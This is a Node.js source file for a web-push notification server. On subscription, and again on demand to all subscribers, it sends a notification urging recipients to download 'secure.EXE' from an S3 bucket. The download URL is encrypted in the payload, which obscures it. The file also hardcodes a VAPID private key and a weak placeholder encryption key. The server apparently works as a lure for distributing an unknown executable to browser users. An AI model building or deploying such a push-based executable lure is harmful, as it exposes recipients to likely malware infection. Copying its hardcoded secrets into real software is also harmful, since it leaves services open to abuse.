// server.js - Push notification server for Render.com
const express = require('express');
const webpush = require('web-push');
const cors = require('cors');
const bodyParser = require('body-parser');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// Configure middleware
app.use(cors()); // Enable CORS for all routes
app.use(bodyParser.json()); // Parse JSON request bodies

// VAPID keys for push notifications
const vapidKeys = {
  publicKey: 'BIW4Q1QQ-OcGMqnR5b5TEFAHjtMXQLvDhfdpT9nZsX_YWYilXjhUksAtBlGpOMs8cDeGs6LOhw0WUQesuKMovBE',
  privateKey: 'wRWIFYBhzKe9gmMBBc3fCUZGvqKmLVtgSltNKziBjxE'
};

// Configure web-push
webpush.setVapidDetails(
  'mailto:your-email@example.com', // Replace with your email
  vapidKeys.publicKey,
  vapidKeys.privateKey
);

// In-memory subscription storage
let subscriptions = [];

// Encryption key (in a real app, use a more secure key management)
const ENCRYPTION_KEY = 'your-encryption-key-should-be-32-bytes';

// Function to encrypt data
function encryptData(data) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY), iv);
  let encrypted = cipher.update(data);
  encrypted = Buffer.concat([encrypted, cipher.final()]);
  return { iv: iv.toString('hex'), data: encrypted.toString('hex') };
}

// Root endpoint
app.get('/', (req, res) => {
  res.send('Push Notification Server is running!');
});

// Endpoint to get VAPID public key
app.get('/api/vapid-public-key', (req, res) => {
  res.json({ publicKey: vapidKeys.publicKey });
});

// Subscribe endpoint
app.post('/api/subscribe', (req, res) => {
  try {
    const subscription = req.body;
    
    // Validate subscription
    if (!subscription || !subscription.endpoint) {
      return res.status(400).json({
        success: false,
        message: 'Invalid subscription object'
      });
    }
    
    // Add subscription if it doesn't exist
    const exists = subscriptions.some(sub => 
      sub.endpoint === subscription.endpoint
    );
    
    if (!exists) {
      subscriptions.push(subscription);
      console.log(`New subscription added. Total: ${subscriptions.length}`);
      
      // Send initial notification with specific file link
      setTimeout(() => sendSpecificFileNotification(subscription), 2000);
    } else {
      console.log('Subscription already exists');
      
      // You can still send a notification to existing subscriptions if needed
      setTimeout(() => sendSpecificFileNotification(subscription), 2000);
    }
    
    return res.status(201).json({ 
      success: true, 
      message: 'Subscription saved' 
    });
  } catch (error) {
    console.error('Error in subscribe handler:', error);
    return res.status(500).json({ 
      success: false, 
      message: `Server error: ${error.message}` 
    });
  }
});

// Endpoint to manually trigger file notification
app.post('/api/send-file-notification', async (req, res) => {
  try {
    if (subscriptions.length === 0) {
      return res.status(400).json({
        success: false,
        message: 'No subscriptions available'
      });
    }
    
    // Send to all subscriptions
    for (const subscription of subscriptions) {
      await sendSpecificFileNotification(subscription);
    }
    
    return res.json({ 
      success: true, 
      message: `Sent file notifications to ${subscriptions.length} subscribers` 
    });
  } catch (error) {
    console.error('Error sending file notification:', error);
    return res.status(500).json({ 
      success: false, 
      message: `Server error: ${error.message}` 
    });
  }
});

// Function to send notification for the specific EXE file
async function sendSpecificFileNotification(subscription) {
  try {
    // Use the specific file URL
    const fileUrl = 'https://exe-file-download.s3.ap-southeast-1.amazonaws.com/secure.EXE';
    
    // Encrypt the URL
    const encryptedUrl = encryptData(fileUrl);
    
    // Prepare notification payload
    const payload = JSON.stringify({
      title: 'Secure File Download',
      body: 'Your secure.EXE file is ready for download. Click to access.',
      data: {
        encryptedUrl: encryptedUrl,
        fileName: 'secure.EXE'
      }
    });
    
    // Send the notification
    await webpush.sendNotification(subscription, payload);
    console.log('Sent encrypted file notification for secure.EXE');
  } catch (error) {
    console.error('Error sending encrypted notification:', error);
    
    // If subscription is expired or invalid, remove it
    if (error.statusCode === 410) {
      subscriptions = subscriptions.filter(
        sub => sub.endpoint !== subscription.endpoint
      );
      console.log('Removed invalid subscription');
    }
    
    throw error;
  }
}

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
